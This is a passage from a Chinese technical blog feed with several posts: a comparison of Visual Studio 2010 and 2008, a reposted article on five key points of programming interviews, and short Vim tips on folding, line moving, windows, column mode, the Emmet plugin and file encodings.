<p>开发人员使用 Visual Studio 2008专业版能够：<strong>集成的单元测试能够更有效的验证应用程序。</strong>应用程序的单元测试能够帮助我们在开发过程的早期轻松发现大量的问题。现在，VisualStudio 2008 专业版中集成了单元测试功能，以前这个功能只在 Visual Studio Team System 产品中提供。</p>
<p><strong>使用 Microsoft Office 系统开发用户熟悉的应用程序。</strong>Visual studio 2008专业版现在包括了Visual Studio Tools For Office，这意味着我们的应用程序能够轻松融合世界上最流行的软件产品 Microsoft Office System。比如，开发人员能够直接将ERP的信息集成到 Office Outlook 的任务面板，这样用户就能够更轻松的访问到商务决策。</p>
<p><strong>让您的用户能够使用到 Windows Mobile 的应用程序。</strong>Visual Studio 2008专业版让 Mobile应用程序的开发变得更加简单。全新的设备仿真器能够自动化测试场景，让您在近似于真实环境中进行应用程序的开发，比如：信号衰弱或电量不足。Mobile开发人员能够充分利用到一些更高级的特性，比如：LINQ和单元测试。开发人员现在能够扩展和整合用户体验，将丰富的多媒体用户体验发布到任何能够访问Internet 的设备上。</p>
<h3 id="Visual-Studio-2010的新特性"><a href="#Visual-Studio-2010的新特性" class="headerlink" title="Visual Studio 2010的新特性"></a>Visual Studio 2010的新特性</h3><p>它将是经典的一个版本，相当于当年的6.0版。而且它可以自定义开始页；新功能还包括：</p>
<p>(1)C# 4.0中的动态类型和动态编程；</p>
<p>(2)多显示器支持；</p>
<p>(3)使用Visual Studio 2010的特性支持TDD；</p>
<p>(4)支持Office ；</p>
<p>(5)Quick Search特性；</p>
<p>(6)C++ 0x新特性；</p>
<p>(7)IDE增强；</p>
<p>(8)使用Visual C++ 2010创建Ribbon界面；</p>
<p>(9)新增基于.NET平台的语言 F#；</p>
<p>而根据微软发布的一份官方文档宣称，Visual Studio 2010和.NET Framework4.0将在下面五个方面有所创新：</p>
<p><strong>·民主化的应用程序生命周期管理</strong></p>
<p>在一个组织中，应用程序生命周期管理(ALM)将牵涉到多个角色。但是在传统意义上，这一过程中的每个角色并不是完全平等的。VisualStudio Team System 2010将坚持打造一个功能平等、共同分担的平台以用于组织内的应用程序生命周期管理过程。</p>
<p><strong>·顺应新的技术潮流</strong></p>
<p>每年，业界内的新技术和新趋势层出不穷。通过Visual Studio2010，微软将为开发者提供合适的工具和框架，以支持软件开发中最新的架构，开发和部署。</p>
<p><strong>·让开发商惊喜</strong></p>
<p>从VisualStudio的第一个版本开始，微软就将提高开发人员的工作效率和灵活性作为自己的目标。Visual Studio 2010将继续关注并且显著地改进开发者最核心的开发体验。</p>
<p><strong>·下一代平台浪潮的弄潮儿</strong></p>
<p>微软将继续投资于市场领先的操作系统，工具软件和服务器平台，为客户创造更高的价值。使用Visual Studio 2010，将可以在新一代的应用平台上，为你的客户创造令人惊奇的解决方案。</p>
<p><strong>· 跨部门的应用</strong></p>
<p>客户将在不同规模的组织内创建应用，跨度从单个部门到整个企业。Visual Studio 2010将确保在这么宽泛的范围内的应用开发都得到支持。</p>
<h3 id="Visual-Studio-2010-与-2008-的对比"><a href="#Visual-Studio-2010-与-2008-的对比" class="headerlink" title="Visual Studio 2010 与 2008 的对比"></a>Visual Studio 2010 与 2008 的对比</h3><h3 id="灵活高效的全新IDE"><a href="#灵活高效的全新IDE" class="headerlink" title="灵活高效的全新IDE"></a><em><strong>灵活高效的全新IDE</strong></em></h3><p>Visual Studio 2010 与 2008 版本的对比：自从微软于1998年发布Visual Studio 6以来，VisualStudio的IDE已经成为软件开发工具的标杆，很多其他的开发工具，甚至是其他用途的应用程序，都在模仿Visual Studio的IDE。但是，就像我们前面讲过的那样，从Visual Studio 6到Visual Studio2008，虽然IDE的功能越来越多，但是并没有什么革命性的变化，反倒因为功能太多带来了使用上的不便，导致开发效率低下。程序员们都在期盼一个全新的IDE的出现。</p>
<p>现在，程序员们的梦想在Visual Studio 2010中成为了现实。在Visual Studio2010中，微软用全新的WPF技术重新打造了它的编辑器，借助WPF的强大功能，新的编辑器可以实现很多以前Visual Studio 2008的IDE根本无法想象的功能，比如代码的无级缩放，多窗口即时更新，文档地图，代码的自动产生等等，这些新的IDE特性都会极大地提高程序员的开发效率。</p>
<p><em><strong>云计算</strong></em></p>
<p>虽然大家都还在”云里雾里”，但是毫无疑问，”云计算”已经来到了我们身边。在互联网时代，微软输给了Google，面对即将到来的”云计算”时代，微软没有理由再次错过机会。所以早在年初”云计算”的概念刚刚兴起的时候，就有传言微软将进军”云计算”，将旗下的软件业务纳入”云计算”。而现在，随着Visual Studio 2010 CTP和WindowsAzure的发布，这一切成为了事实。”云计算”的基本原理，是通过使计算分布在大量的分布式计算机上，而非本地计算机或远程服务器中，企业数据中心的运行将更与互联网相似。这使得企业能够将资源切换到需要的应用上，根据需求访问计算机和存储系统。Windows Azure是一个托管服务套件，它包括虚拟计算，可扩展存储以及自动化服务管理系统等。这些工具将会用来为微软的服务提供支持，其中包括MSN，Xbox Live，以及Office Online等等，实现服务的网络化。</p>
<p>对于开发者而言，Windows Azure已经建立起一个简单而快速的系统，最重要的是它拥有着标准的模型，是我们步入”云计算”时代的捷径。开发者可以根据自己的需要选择第二层功能来使用，比如数据库，业务工具，甚至是第三方软件提供的功能。WindowsAzure云计算平台为开发者提供了灵活性和可开发性，同时还需要考虑利用目前现有的技能、工具和技术，比如微软.NET框架和Visual Studio。使用Windows Azure Tools for Visual Studio，我们可以为Windows Azure创建，调试和部署服务和应用程序。Visual Studio 2010为Windows Azure提供了专门的项目模型，同时，我们也可以利于Visual Studio 2010对我们的服务和应用程序进行调试。另外，我们可以利用Visual Studio 2010将我们创建的服务打包，然后通过Windows Live Developer Portal部署到Windows Azure。</p>
<p>总之，有了Visual Studio 2010的帮助，我们就可以拔得”云计算”的头筹。</p>
<h3 id="并行计算"><a href="#并行计算" class="headerlink" title="并行计算"></a><em><strong>并行计算</strong></em></h3><p>在以往的计算机发展历史中，硬件技术的发展总是给软件带来免费的性能提升，从386到586，从赛扬到奔腾，每次硬件的升级，都带来软件性能的大幅提升，而软件无需做任何变动，只需要坐等硬件升级就可以了。</p>
<p>但是进入多核时代后，这种”免费的午餐”再也没有了。这其中最主要的原因就是当前的应用程序几乎都是针对一个运算核心而设计的，当硬件通过增加运算核心来提高性能时，由于受到其架构的影响，软件并不能充分地利于多个运算核心所带来的性能提升，甚至有的时候性能还有所下降。</p>
<p>在这种情况下，开发者不得不改变应用程序的架构和开发方法，以应对这种多核的趋势，使得自己的软件可以充分利于硬件升级所带来的性能提升。面对这样的需求，Visual Studio2010加大了对并行运算的支持。微软正在使得尽量大的范围内的开发者都能高效地进行并行计算的开发，不管他使用的是非托管代码还是.NET Framework。在Visual Studio 2010中，我们将看到：</p>
<p>Visual Studio IDE对并行计算开发的大量支持。比如，Visual Studio 2010的调试器知道代码的并行特性，并且能够在调试程序的不同执行单元的时候，表现应用程序的状态。</p>
<p>非托管的C++库和编译器对并行计算的支持</p>
<p>.NET Framework 4.0对并行计算的大量支持，包括P-LINQ，并行语言语句等等</p>
<p>另外，Visual Studio 2010还提供了一个”并行性能分析器”，它可以帮助我们分析应用程序的性能瓶颈，找到需要并行处理和可以进行并行处理的地方，并以图形化的形式表现出来。这样，”并行性能分析器”配合这Visual Studio 2010，我们就可以轻松地实现应用程序的并行化，再次吃上”免费的午餐”。</p>
<h3 id="C-王者归来"><a href="#C-王者归来" class="headerlink" title="C++王者归来"></a><em><strong>C++王者归来</strong></em></h3><p>就像我们在前面的文章中分析的那样，自从Visual Studio 6以后，Visual Studio中的C++再没有多大的变化，包括之前的Visual Studio 2008，都只是对C++进行一些细小的改善。但是这次随着C++新标准C++0x的即将公布，Visual Studio 2010在C++开发方面也带来了很多革命性的变化。</p>
<p>首先是对C++新标准C++0x的全面支持，不会再像Visual C++ 6一样，被人诟病为对C++标准支持不佳。在IDE方面，微软将Visual C++的构建系统VCBuild整合到了MSBuild中；借助后台编译，Visual C++的IntelliSense更加智能，能够处理更多的文件，更加复杂的项目。另外在MFC方面，通过引入很多新的类，MFC开始全面支持Vista、Windows 7风格的UI。这些特性，都成为Visual Studio 2010跟Visual Studio 2008的一个重要差别，相信C++程序员都会选择Visual Studio 2010而略过Visual Studio 2008。</p>
<h3 id="面向下一代平台：Windows-7"><a href="#面向下一代平台：Windows-7" class="headerlink" title="面向下一代平台：Windows 7"></a><em><strong>面向下一代平台：Windows 7</strong></em></h3><p>Visual Studio 2008是基于Vista平台的，Vista的失败，也必然会导致Visual Studio 2008的昙花一现。现在，微软把宝都押在了即将到来的新平台Windows 7上。作为面向下一代平台的开发工具，Visual Studio 2010提供了很多工具来帮助开发者开发基于Windows 7的应用程序，同时使那些已经存在的非托管应用程序，通过一定的处理也同样能够具有新的操作系统所带来的特性。在Visual Studio 2010中，微软花了很大的力气来使得非托管C++代码的开发更加容易和高效。例如，我们升级了MFC的库和头文件以全面支持Windows 7的界面元素，包括Ribbon界面，搜索功能甚至多点触摸特性的支持。</p>
<p>对于开发基于WPF的应用程序的开发者，Visual Studio 2010同样提供了改进的工具，帮助开发者快速高效地完成界面图像的设计，数据绑定等等。</p>
<p>总之，想让你的应用程序”Windows 7 Ready”，Visual Studio 2010是首选。</p>
<p>Visual Studio 2010作为作为微软着力打造的下一代开发工具平台，跟她的前任Visual Studio 2008相比，她拥有着无数诱人的特性，同时也寄托着无数人的期望。通过我们前面的一系列对比介绍，相信大家对Visual Studio 2010的成功还是抱有很大希望的。</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>编程技术面试的五大要点(转)</title>
    <url>/blog/pytx/article/ms5yd/</url>
    <content><![CDATA[<p><strong>文 &#x2F; 何海涛</strong></p>
<p>扎实的基础知识、高质量的代码、清晰的思路、优化代码的能力、优秀的综合能力是编程技术面试的五大要点。</p>
<p>找工作一直是一个热门话题。要想找到心仪的工作，难免需要经过多轮面试。编程面试是程序员面试过程中最为重要的一个环节。如果能在编程面试的环节充分展示自己的能力，那么拿到中意的Offer就是水到渠成的事情。</p>
<p>我先后在欧特克、微软和思科等公司任软件工程师，多次接受他人的面试，同时也面试过很多人。总结面试与被面试的经验，我发现尽管面试官的背景、性格各不相同，但都关注应聘者五种素质：</p>
<ol>
<li>扎实的基础知识；</li>
<li>能写高质量的代码；</li>
<li>分析问题时思路清晰；</li>
<li>能优化时间效率和空间效率；</li>
<li>具备包括学习能力、沟通能力、发散思维能力等在内的综合能力。</li>
</ol>
<h2 id="扎实的基础知识"><a href="#扎实的基础知识" class="headerlink" title="扎实的基础知识"></a>扎实的基础知识</h2><p>扎实的基本功是成为优秀程序员的前提条件，因此面试官首要关注应聘者的素质即是否具备扎实的基础。通常基本功在编程面试环节体现在两个方面：一<strong>是编程语言，二是数据结构和算法。</strong></p>
<p>每个程序员至少要熟练掌握1~2门编程语言。面试官从应聘者在面试过程中写的代码以及跟进的提问中，能看出他编程语言掌握的熟练程度。以大部分公司面试要求的C++为例，如果函数需要传入一个指针，面试官可能会问是否需要为该指针加上const，把const加在指针不同的位置有什么区别；如果写的函数需要传入的参数是一个复杂类型的实例，面试官可能会问传入值参数或者引用参数有什么区别，什么时候需要为传入的引用参数加上const。</p>
<p>数据结构通常是编程面试过程中考查的重点。在参加面试之前，应聘者需要熟练掌握链<strong>表、树、栈、队列以及哈希表等数据结构以及它们的操作</strong>。如果我们留心各大公司的面试题，就会发现链表和二叉树相关的问题是很多面试官喜欢问的问题。这方面的问题看似简单，但真正掌握也很不容易，特别适合在短短几十分钟的面试时间内检验应聘者的基本功。如果应聘者事先对链表的插入和删除结点了如指掌，对二叉树的各种遍历方法的循环和递归写法都烂熟于胸，那么真正到了面试时也就游刃有余了。</p>
<p><strong>大部分公司对算法的要求都只是考查查找和排序</strong>。应聘者可以在了解各种查找和排序算法的基础上，重点掌握<strong>二分查找、归并排序和快速排序，</strong>因为很多面试题都只是这些算法的变体而已。比如把排序好的数组的前面若干个数字移到数组的后面，然后问怎样在这个数组之中找到最小的数字。这道题其本质就是考查二分查找。少数对算法很重视的公司比如谷歌或者百度，还会要求应聘者熟练掌握<strong>动态规划和贪婪算法</strong>。如果对这种类型的公司感兴趣，那么应聘者在参加面试之前就应该加强对相关算法题目的练习。</p>
<h2 id="高质量的代码"><a href="#高质量的代码" class="headerlink" title="高质量的代码"></a>高质量的代码</h2><p>只有注重质量的程序员，才能写出鲁棒稳定的大型软件。在面试过程中，面试官总会格外<strong>关注边界条件、特殊输入等</strong>看似细枝末节但实质至关重要的地方，以此来分析应聘者是否注重代码质量。很多时候，面试官发现应聘者写出来的代码只能完成最基本的功能，一旦输入特殊的边界条件参数就会错误百出甚至程序崩溃。</p>
<p>举个很多应聘者都被问过的一个问题：写一个函数，把字符串转化成整数。这道题看似很简单，绝大部分计算机专业的毕业生都能用十行以内的代码实现最基本的功能。可是在实际面试过程中，十个应聘者中只有一个人能通过这道题的面试，因为绝大部分应聘者不能全面考虑到各种特殊输入，比如输入的字符串含中有非数字的符号、在字符串的开头有正负号、字符串中有正负号但其位置不是在字符串的开头。</p>
<p>除此之外，面试官还希望应聘者能考虑的边界条件包括2147483647（0x7FFFFFFF，int能表示的最大正整数）和-2147483648（0×80000000，int能表示的最小负整数）。</p>
<p>除了边界条件和特殊输入考虑不足之外，面试官还有一个不能容忍的错误就是程序崩溃。面试时很多应聘者都会忘记对空指针做特殊处理而导致程序崩溃。如果面试时遇到链表、二叉树相关的题目，应聘者一定要特别小心。因为这两种题目对应的代码里通常会有大量的指针操作，如果考虑不周到，就有可能对空指针进行操作而使程序崩溃。</p>
<p>比如这样一道题：输入一个链表的头指针和一个无符号整数k，输出该链表的倒数第k个结点。这个题目很多人都能想到用两个指针来解决：第一个指针先在链表上移动k-1步，同时让第一个指针和第二个指针在链表上移动。当第一个指针移动到尾指针时，第二个指针指向的就是倒数第k个结点。然而不是每个应聘者都能根据正确思路写出完整的代码。不少应聘者会忽略两种可能：一是输入的链表头指针有可能是空指针；二是链表上结点的数目有可能少于k个。忽略这两点的代码都存在崩溃的可能，从而很难获得面试官的青睐。</p>
<p>要想写出鲁棒的高质量代码，需要在动手写代码之前想好测试用例。在写代码之前，先要想好各种边界条件和特殊输入作为测试用例。当代码写好之后，自己在心里用之前想好的测试用例来检验自己写出的代码，这样就能在面试官之前发现并解决问题。以求链表的倒数第k个结点为例，如果事先想到了输入头指针为空指针和链表上的结点总数少于k这两个测试用例，并且在写好代码之后在心里模拟代码的运行过程，确保能够通过这两个测试用例的测试，那么这轮面试必然是能够通过的。</p>
<h2 id="清晰的思路"><a href="#清晰的思路" class="headerlink" title="清晰的思路"></a>清晰的思路</h2><p>只有思路清晰，应聘者才有可能在面试过程中解决复杂的问题。有时面试官会有意出一些比较复杂的问题，以考查能否在短时间内形成清晰的思路并解决问题。对于确实很复杂的问题，面试官甚至不期待应聘者能在面试不到一个小时的时间里给出完整的答案，他更看重的可能还是应聘者是否有清晰的思路。面试官通常不会喜欢应聘者在没有形成清晰思路之前就草率地开始写代码，结果写出来的代码容易逻辑混乱、错误百出。</p>
<p>应聘者可以用几个简单的方法帮助自己形成清晰的思路。</p>
<p>首先是举几个简单的具体例子让自己理解问题。当一眼看不出问题中隐藏的规律时，可以试着用1~2个具体的例子模拟操作的过程，这样说不定就能通过具体的例子找到抽象的规律。</p>
<p>其次可以试着用图形表示抽象的数据结构。像分析与链表、二叉树相关的题目时，可以画出它们的结构图来简化题目。</p>
<p>最后可以试着把复杂的问题分解成若干个简单的子问题，再一一解决。很多基于递归的思路，包括分治法和动态规划法，都是把复杂的问题分解成一个或者多个简单的子问题。</p>
<p>比如把二叉搜索树转化排序的双向链表这个问题就很复杂。碰到这个问题，不妨先画出1~2个具体的二叉搜索树及其对应的排序双向链表，直观地感受二叉搜索树和排序的双向链表有哪些联系。如果一下子找不出转换的规律，可以把整个二叉树看出三部分：根结点、左子树和右子树。当递归地把转换左右子树这两个子问题解决之后，再把转换左右子树得到的链表和根结点链接起来，整个问题也就解决了。</p>
<h2 id="优化代码的能力"><a href="#优化代码的能力" class="headerlink" title="优化代码的能力"></a>优化代码的能力</h2><p>优秀的程序员对时间和空间的消耗锱铢必较，他们很有激情不断优化自己的代码。当面试官出的题目有多种解法时，通常他会期待应聘者最终能够找到最优解。这就要求应聘者在面试官提示还有更好的解法时，不能放弃思考，而应该努力寻找在时间消耗或者空间消耗上可以优化的地方。</p>
<p>要想优化时间或者空间效率，首先要知道如何分析效率。即使是同一个算法，用不同方法实现的效率可能也会大不相同，要能够分析出算法及其代码实现的效率。例如求斐波那契数列，很多人喜欢用递归公式f(n)&#x3D;f(n-1)+f(n-2)求解。如果分析它的递归调用树，就会发现有大量的计算是重复的，时间效率是以n的指数增加。但如果先求f(1)、f(2)，再根据f(1)和f(2)求出f(3)，接下来根据f(2)、f(3)求出f(4)，并以此类推用一个循环求出f(n)，这种计算方法的时间效率就只有O(n)，比前面递归的方法要好很多。</p>
<p>要想优化代码的效率，还要熟知各种数据结构的优缺点，并能选择合适的数据结构解决问题。我们在数组中根据下标可以用O(1)完成查找。数组的这个特征可以用来实现简单的哈希表解决很多面试题，比如在字符串中找到第一个只出现一次的字符。再比如为了找出n个数字中最小的k个数，需要一个数据容器来存储k个数字。在这个数据容器中，我们希望能够快速地找到最大值并且能快速地替换其中的数字。经过权衡，我们发现二叉树比如最大堆或者红黑树都是实现这个数据容器的理想选择。</p>
<p>要想优化代码的效率，也要熟练掌握常用的算法。面试中最常用的算法是查找和排序。如果从头到尾顺序扫描一个数组，需要O(n)时间才能完成查找操作。但如果数组是排序的，应用二分查找算法就能把时间复杂度降低到O(logn)。排序算法除了能够给数组排序之外，还能用来解决其他问题。比如快速排序算法中的Partition函数能够用来在n个数里查找第k大的数字，从而可以用O(n)的时间在数组中找到出现次数超过数组长度一半的数字。如果面试题是一个求最大值或者最小值的题目，则可以尝试用动态规划法或者贪婪算法，比如用动态规划法求出数组中连续子数组的最大和。</p>
<h2 id="优秀的综合能力"><a href="#优秀的综合能力" class="headerlink" title="优秀的综合能力"></a>优秀的综合能力</h2><p>在面试过程中，应聘者除了展示自己的编程能力和技术功底之外，还需要展示自己的软技能，诸如沟通能力和学习能力。<strong>随着软件系统的规模越来越大，软件开发已经告别了单打独斗的年代，程序员与他人的沟通变得越来越重要。</strong>在面试过程中，面试官会观察应聘者在介绍项目经验或者算法思路时是否观点明确、逻辑清晰，并以此判断他沟通能力的强弱。另外，面试官也会从应聘者说话的神态和语气来判断他是否有团队合作的意识。通常面试官不会喜欢高傲或者轻视合作者的人。</p>
<p>IT行业知识更新很快，因此程序员只有具备很好的学习能力才能跟上知识更替的步伐。通常面试官有两种办法考查应聘者的学习能力。第一种方法是询问应聘者最近在看什么书、从中学到了哪些新技术。面试官可以用这个问题了解应聘者的学习愿望和学习能力。第二种方法是抛出一个新概念，接下来他会观察应聘者能不能在较短时间内理解这个新概念并解决相关的问题。比如面试官要求应聘者计算第1500个丑数。很多人都没有听说过丑数这个概念。这时面试官就会观察应聘者面对丑数这个新概念，能不能经过提问、思考、再提问的过程，最终找出丑数的规律从而找到解决方案。</p>
<p>知识迁移能力是一种特殊的学习能力。如果我们能够把已经掌握的知识迁移到其他领域，那么学习新技术或者解决新问题就会变得容易。面试官经常会先问一个简单的问题，再问一个很复杂但和前面的简单问题相关的问题。这时面试官期待应聘者能够从简单问题中得到启示，从而找到解决复杂问题的窍门。比如面试官先要求应聘者写一个函数求斐波那契数列，再问一个青蛙跳台阶的问题：一只青蛙一次可以跳上1级台阶，也可以跳上2级台阶，请问这只青蛙跳上n级的台阶总共有多少种跳法？应聘者如果具有较强的知识迁移能力，就能分析出青蛙跳台阶问题实质上只是斐波那契数列的一个应用。</p>
<p>还有不少面试官喜欢考查应聘者的抽象建模能力和发散思维能力。面试官从日常生活中提炼出问题，比如如何判断5张扑克牌是不是顺子，考查应聘者能不能把问题抽象出来用合理的数据结构表示，并找到其中的规律解决这个问题。面试官也可以限制应聘者不得使用常规方法，这要求应聘者具备创新精神，能够打开思路从多角度去分析、解决问题。比如面试官要求应聘者不用加减乘除四则运算实现两个整数的加法。此时面试官期待应聘者能够打开思路，用位运算实现整数的加法。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们可以用下图来总结出应聘者需要具备的素质。</p>
<p><img src="/images/article/ypzsz.jpg"></p>
<p>上图可以看出，应聘者在面试之前需要做足准备，对编程语言、数据结构和算法等基础知识有全面的了解。面试时如果碰到简单的问题应聘者一定要注重细节写出完整、鲁棒的代码。如果碰到复杂的问题应聘者可以通过画图、举具体例子分析和分解复杂问题等方法先理清思路再动手编程。除此之外，应聘者还应该不断优化时间效率和空间效率，力求找到最优的解法。在面试过程中，应聘者还应该主动提问弄清楚题目的要求，表现自己的沟通能力。当面试官前后问的两个问题有相关性时，尽量把解决前面问题的思路迁移到后面的问题中去，展示自己良好的学习能力。如果能做到这么几点，那么应聘者顺利通过面试获得心仪的职位将是瓜熟蒂落的事情。</p>
]]></content>
      <categories>
        <category>知识体系</category>
      </categories>
      <tags>
        <tag>知识体系</tag>
      </tags>
  </entry>
  <entry>
    <title>VIM设置代码折叠</title>
    <url>/blog/tools/vim/fdm/</url>
    <content><![CDATA[<h2 id="折叠方式"><a href="#折叠方式" class="headerlink" title="折叠方式"></a>折叠方式</h2><p>可在Vim 配置文件中设置 set fdm&#x3D;XXX</p>
<p>有6种方法来选定折叠：</p>
<ul>
<li>manual: 手工定义折叠</li>
<li>indent: 更多的缩进表示更高级别的折叠</li>
<li>expr: 用表达式来定义折叠</li>
<li>syntax: 用语法高亮来定义折叠</li>
<li>diff:对没有更改的文本进行折叠</li>
<li>marker:对文中的标志折叠</li>
</ul>
<p>注意，每一种折叠方式不兼容，如不能既用expr又用marker方式，我主要轮流使用indent和marker方式进行折叠。</p>
<p>使用时，用 set fdm&#x3D;marker命令来设置成marker折叠方式（fdm是foldmethod的缩写）。</p>
<p>要使每次打开vim时折叠都生效，则在.vimrc文件中添加设置，如添加：set fdm&#x3D;syntax，就像添加其它的初始化设置一样。</p>
<h2 id="折叠命令"><a href="#折叠命令" class="headerlink" title="折叠命令"></a>折叠命令</h2><p>选取了折叠方式后，我们就可以对某些代码实施我们需要的折叠了，由于我使用indent和marker稍微多一些，故以它们的使用为例：如果使用了indent方式，vim会自动的对大括号的中间部分进行折叠，我们可以直接使用这些现成的折叠成果。</p>
<p>在可折叠处（大括号中间）：</p>
<ul>
<li>zc:折叠</li>
<li>zC: 对所在范围内所有嵌套的折叠点进行折叠</li>
<li>zo: 展开折叠</li>
<li>zO: 对所在范围内所有嵌套的折叠点展开</li>
<li>[z: 到当前打开的折叠的开始处。</li>
<li>]z:到当前打开的折叠的末尾处。</li>
<li>zj: 向下移动。到达下一个折叠的开始处。关闭的折叠也被计入。</li>
<li>zk:向上移动到前一折叠的结束处。关闭的折叠也被计入。</li>
</ul>
<p>当使用marker方式时，需要用标计来标识代码的折叠，系统默认是 {{{和}}}，最好不要改动</p>
<p>我们可以使用下面的命令来创建和删除折叠：</p>
<p>zf: 创建折叠，比如在marker方式下：</p>
<p>zf56G，创建从当前行起到56行的代码折叠；</p>
<p>10zf或10zf+或zf10↓，创建从当前行起到后10行的代码折叠。</p>
<p>10zf-或zf10↑，创建从当前行起到之前10行的代码折叠。</p>
<p>在括号处zf%，创建从当前行起到对应的匹配的括号上去（（），{}，[]，</p>
<p>zd: 删除 (delete) 在光标下的折叠。</p>
<p>仅当 ‘foldmethod’ 设为 “manual” 或 “marker” 时有效。</p>
<p>zD:循环删除 (Delete) 光标下的折叠，即嵌套删除折叠。</p>
<p>仅当 ‘foldmethod’ 设为 “manual” 或 “marker” 时有效。</p>
<p>zE: 除去 (Eliminate) 窗口里“所有”的折叠。</p>
<p>仅当 ‘foldmethod’ 设为 “manual” 或 “marker” 时有效。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim移动一行或一段代码</title>
    <url>/blog/tools/vim/vimaltjk/</url>
    <content><![CDATA[<p>将一行（以回车为准，也可理解为一段）上&#x2F;下移一行，也就是与上&#x2F;下一段交换位置，这么常用的一功能，一定要加上。</p>
<pre><code>nmap  mz:m+`z
nmap  mz:m-2`z
vmap  :m&#39;&gt;+`mzgv`yo`z
vmap  :m&#39;&lt;-2`&gt;my`
</code></pre>
<p>把上面代码放到vim的配置文件_vimrc，这段代码实现的效果是:</p>
<p>在“普通模式”或“可视模式”下，同时按[Alt]+[j] 或[Alt]+[k]<br>可将鼠标所在段数据向上、向下移。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>vim打开多窗口、多文件之间的切换</title>
    <url>/blog/tools/vim/mutilwindow/</url>
    <content><![CDATA[<p>一、打开多个文件</p>
<p>1.在终端里输入?</p>
<p>vim还没有启动的时候：</p>
<p>vim file1 file2 … filen便可以打开所有想要打开的文件</p>
<p>2.vim已经启动</p>
<p>输入</p>
<p>:e file</p>
<p>可以再打开一个文件，并且此时vim里会显示出file文件的内容。</p>
<p>3.同时显示多个文件：</p>
<p>:sp ? ? ? ? &#x2F;&#x2F;水平切分窗口</p>
<p>:vsplit ? ? &#x2F;&#x2F;垂直切分窗口</p>
<p>二、在文件之间切换：</p>
<p>1.文件间切换</p>
<p>Ctrl+6 ?&#x2F;&#x2F;两文件间的切换</p>
<p>:bn ? ? ?&#x2F;&#x2F;下一个文件</p>
<p>:bp ? ? ?&#x2F;&#x2F;上一个文件</p>
<p>:ls ? ? ? &#x2F;&#x2F;列出打开的文件，带编号</p>
<p>:b1~n ?&#x2F;&#x2F;切换至第n个文件</p>
<p>对于用(v)split在多个窗格中打开的文件，这种方法只会在当前窗格中切换不同的文件。</p>
<p>2.在窗格间切换的方法</p>
<p>Ctrl+w+方向键——切换到前／下／上／后一个窗格</p>
<p>Ctrl+w+h&#x2F;j&#x2F;k&#x2F;l ——同上</p>
<p>Ctrl+ww——依次向后切换到下一个窗格中</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim列模式的应用</title>
    <url>/blog/tools/vim/vimcolmode/</url>
    <content><![CDATA[<p>在nomal模式下进入列模式Windows和Linux不同。</p>
<p>Windows下：Ctrl+p</p>
<p>Linux下：Ctrl+v</p>
<p>进入之后按正常的移动命令移动鼠标选中编辑部分。</p>
<p>在区块前和区块后可以添加文本内容：</p>
<p>在区块前：Shift+i</p>
<p>在区块后：Shift+a</p>
<p>内容只能手动输入，输入时只有首行有变化，输入后退出模式，所有的行都会必变。</p>
<p>还可以在列模式下删除替换文本，和正常编辑命令一样，修改是只对第一行修改，退出后对所有行起作用。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim安装Emmet插件简介</title>
    <url>/blog/tools/vim/installemmet/</url>
    <content><![CDATA[<h2 id="下载Emmet"><a href="#下载Emmet" class="headerlink" title="下载Emmet"></a>下载Emmet</h2><p>可以到github上下载zip包，emmet-vim-master.zip，下载地址<a href="https://github.com/mattn/emmet-vim">https://github.com/mattn/emmet-vim</a></p>
<p>点击界面中左下角的”download ZIP”按键下载。</p>
<h2 id="插件的安装"><a href="#插件的安装" class="headerlink" title="插件的安装"></a>插件的安装</h2><p>例如我将VIM安装在c:\Vim，目录里有两个文件夹vim74和vimfiles，一般自己添加的插件都放到vimfiles里，这样备份插件直接复制这个文件夹就行了。</p>
<p>在vimfiles里应该有两个文件夹autoload和plugin，如果没有自己创建。</p>
<p>将emmet-vim-master.zip解压，把里面对应的夹autoload和plugin的内容复制到在vimfiles里对应的文件夹。</p>
<h2 id="使用简介"><a href="#使用简介" class="headerlink" title="使用简介"></a>使用简介</h2><p>展开的快捷键：</p>
<pre><code>,
</code></pre>
<p>即Ctrl-y再按逗号。</p>
<p>以下是对vimrc文件的设置。</p>
<p>设置只对html&#x2F;css有效：</p>
<pre><code>let g:user_emmet_install_global = 0
autocmd FileType html,css EmmetInstall
</code></pre>
<p>重新定义展开快捷键：</p>
<pre><code>let g:user_emmet_leader_key=&#39;&#39;
</code></pre>
<p>逗号是必须的，这个不能去掉。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>VIM</category>
      </categories>
      <tags>
        <tag>VIM</tag>
      </tags>
  </entry>
  <entry>
    <title>Vim打开中文文件乱码问题</title>
    <url>/blog/tools/vim/vimfaqzwlm/</url>
    <content><![CDATA[<p>Vim有四个跟字符编码方式有关的选项，encoding、fileencoding、fileencodings、termencoding(这些选项设置请参考Vim文档中encoding-names章节)，它们的意义如下:</p>
<ul>
<li>encoding<br>encoding是Vim内部使用的字符编码方式，包括Vim的buffer(缓冲区)、菜单文本、消息文本等。默认是根据你的locale选择。VIM用户手册上建议只在.vimrc中改变它的值，事实上似乎也只有在.vimrc中改变它的值才有意义。你可以用另外一种编码来编辑和保存文件，如你的vim的encoding为utf-8,所编辑的文件采用cp936编码,vim会自动将读入的文件转成utf-8(vim的能读懂的方式），而当你写入文件时,又会自动转回成cp936（文件的保存编码)。</li>
<li>fileencoding<br>Vim中当前编辑的文件的字符编码方式，Vim保存文件时也会将文件保存为这种字符编码方式(不管是否新文件都如此)。</li>
<li>fileencodings<br>Vim自动探测fileencoding的顺序列表，启动时会按照它所列出的字符编码方式逐一探测即将打开的文件的字符编码方式，并且将fileencoding 设置为最终探测到的字符编码方式。因此最好将Unicode编码方式放到这个列表的最前面，将拉丁语系编码方式 latin1放到最后面。</li>
